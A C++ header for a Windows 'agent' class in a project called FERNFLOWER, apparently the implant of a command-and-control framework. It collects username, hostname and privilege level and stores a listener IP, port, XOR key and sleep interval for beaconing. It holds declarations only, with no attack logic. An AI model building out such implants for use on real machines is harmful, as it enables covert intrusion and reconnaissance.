//
// Created by kibkib on 24.09.2023.
//

#ifndef FERNFLOWER_AGENT_H
#define FERNFLOWER_AGENT_H
#include <string>
#include <windows.h>
#include "systeminfo.h"
#include "config.h"

class agent {
    systeminfo systeminfo;
    std::string username {systeminfo.getUsername()};
    std::string hostname {systeminfo.getHostname()};
    std::string privilege {systeminfo.getIntegrity()};
    std::string listenerip {LISTENERIP};
    unsigned int listenerport {LISTENERPORT};
    std::string xorkey {XORKEY};
    unsigned int sleep {SLEEP};

public:
    agent();
    std::string getUsername();
    std::string getHostname();
    std::string getPrivilege();
    std::string getIP();
    unsigned int getPort();
    unsigned int getSleep();

};


#endif //FERNFLOWER_AGENT_H
